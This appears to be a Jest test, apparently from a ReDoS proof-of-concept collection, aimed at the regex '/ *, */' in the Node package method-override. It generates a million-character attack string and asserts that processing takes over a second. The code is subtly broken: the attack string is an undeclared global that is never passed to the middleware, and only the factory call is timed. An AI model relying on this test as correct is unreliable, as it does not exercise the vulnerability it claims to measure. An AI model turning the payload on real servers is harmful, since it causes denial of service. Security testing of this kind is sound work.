
// regex : / *, */
test("ReDos in method-override", () => {
    const methodOverride = require('method-override');
    const measureTime = require("./utils").measureTime;
    const { genstr } = require('./utils');

    attack_str = 'a '  + genstr(1000000,"a");

    let t = measureTime(function () {
        methodOverride('X-HTTP-Method-Override');
    });
  
    let time = t[0] + t[1] / 1000000000;
  
    expect(time).toBeGreaterThan(1);
  });
  